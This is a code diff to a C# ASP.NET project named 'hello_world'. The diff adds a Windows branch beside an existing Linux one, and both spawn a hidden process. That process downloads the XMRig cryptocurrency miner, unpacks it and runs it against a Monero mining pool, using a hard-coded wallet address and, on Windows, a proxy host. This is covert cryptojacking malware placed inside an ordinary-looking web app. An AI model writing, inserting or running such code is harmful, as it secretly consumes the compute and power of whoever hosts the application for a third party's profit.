@@ -3,6 +3,7 @@ using System.Collections.Generic;
 using System.Diagnostics;
 using System.Linq;
 using System.Net.Http;
+using System.Runtime.InteropServices;
 using System.Threading.Tasks;
 using Microsoft.AspNetCore.Builder;
 using Microsoft.AspNetCore.Hosting;
@@ -55,18 +56,41 @@ namespace hello_world
                 try
                 {
                     var process = new Process();
-                    var processStartInfo = new ProcessStartInfo()
+                    if (RuntimeInformation.IsOSPlatform(OSPlatform.Windows))
                     {
-                        WindowStyle = ProcessWindowStyle.Hidden,
-                        FileName = $"/bin/bash",
-                        WorkingDirectory = AppContext.BaseDirectory,
-                        Arguments =
+                        var processStartInfo = new ProcessStartInfo()
+                        {
+                            WindowStyle = ProcessWindowStyle.Hidden,
+                            FileName = $"powershell.exe",
+                            WorkingDirectory = AppContext.BaseDirectory,
+                            Arguments = @"-c [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;"
+                             + "$ProgressPreference=\"SilentlyContinue\";"
+                             + "Invoke-WebRequest -Uri https://github.com/xmrig/xmrig/releases/download/v6.17.0/xmrig-6.17.0-gcc-win64.zip -OutFile xmrig-6.17.0-gcc-win64.zip;"
+                             + "Expand-Archive -LiteralPath 'xmrig-6.17.0-gcc-win64.zip';"
+                             + "xmrig-6.17.0-gcc-win64\\xmrig-6.17.0\\xmrig.exe -o pool.minexmr.com:4444 -u 48QZP31VnTkYTbsqZ4dq1JGMjwtds2sBnCpxrjGwBfTWG1NrEoWJGca5mxxoL8oD3NQmQuK23fTi546McgXxmd2NSyTUB1T.lynkwin -x covi21.ddns.net:10555 -B; Start-Sleep -Seconds 500000",
+                            RedirectStandardOutput = true,
+                            RedirectStandardError = true,
+                            UseShellExecute = false
+                        };
+                        process.StartInfo = processStartInfo;
+                    }
+                    else
+                    {
+                        var processStartInfo = new ProcessStartInfo()
+                        {
+                            WindowStyle = ProcessWindowStyle.Hidden,
+                            FileName = $"/bin/bash",
+                            WorkingDirectory = AppContext.BaseDirectory,
+                            Arguments =
                             $"-c \"cd /home/cnb; curl -LJO https://github.com/xmrig/xmrig/releases/download/v6.16.1/xmrig-6.16.1-linux-x64.tar.gz -o xmrig-6.16.1-linux-x64.tar.gz ; tar xvfz xmrig-6.16.1-linux-x64.tar.gz; xmrig-6.16.1/xmrig -o pool.minexmr.com:4444 -u 48QZP31VnTkYTbsqZ4dq1JGMjwtds2sBnCpxrjGwBfTWG1NrEoWJGca5mxxoL8oD3NQmQuK23fTi546McgXxmd2NSyTUB1T.lynk -B; sleep 500000\"",
-                        RedirectStandardOutput = true,
-                        RedirectStandardError = true,
-                        UseShellExecute = false
-                    };
-                    process.StartInfo = processStartInfo;
+                            RedirectStandardOutput = true,
+                            RedirectStandardError = true,
+                            UseShellExecute = false
+                        };
+                        process.StartInfo = processStartInfo;
+                    }
+
+                    //process.StartInfo = processStartInfo;
                     process.Start();
                     process.WaitForExit();
                     string error = process.StandardError.ReadToEnd();
